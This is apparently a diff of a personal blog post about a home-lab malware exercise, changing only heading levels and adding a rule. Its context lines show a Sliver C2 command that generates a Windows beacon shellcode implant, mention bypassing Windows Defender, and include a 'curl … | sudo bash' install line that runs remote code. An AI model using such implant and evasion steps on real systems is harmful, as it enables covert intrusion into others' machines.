@@ -16,7 +16,7 @@ So I've been doing some couples of malware academy modules and reverse engineeri
 
 ## 2. SETUP
 
-### SETTING UP SLIVER C2 ON KALI
+#### SETTING UP SLIVER C2 ON KALI
 
 1. Generating beacon profile implant : `profiles new beacon --mtls 192.168.38.128 --os windows --arch amd64 --format shellcode --seconds 5 --jitter 3 win_implant`
 
@@ -30,7 +30,7 @@ So I've been doing some couples of malware academy modules and reverse engineeri
 >[!warning]
 >You might encounter issues while trying to generate your stager, if you've installed sliver with this : `curl https://sliver.sh/install|sudo bash`. You might need to install it from the release binaries
 
-### SETTING UP TARGET WINDOWS MACHINE
+#### SETTING UP TARGET WINDOWS MACHINE
 
 1. Install Windows on a VM
 2. Make sure windows defender is up to date and activated
@@ -81,6 +81,8 @@ So I've been doing some couples of malware academy modules and reverse engineeri
 - So, I tried a bunch of different things, but always ended up at the same result, but, at least the good news is that I was able to bypass windows defender, right? We have to stay positive in this field, count them small wins...
 
 {{< image src="/images/Pasted image 20250624141138.png" alt="20250624141138" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}
+
+---
 
 ### 3. Conclusion
 
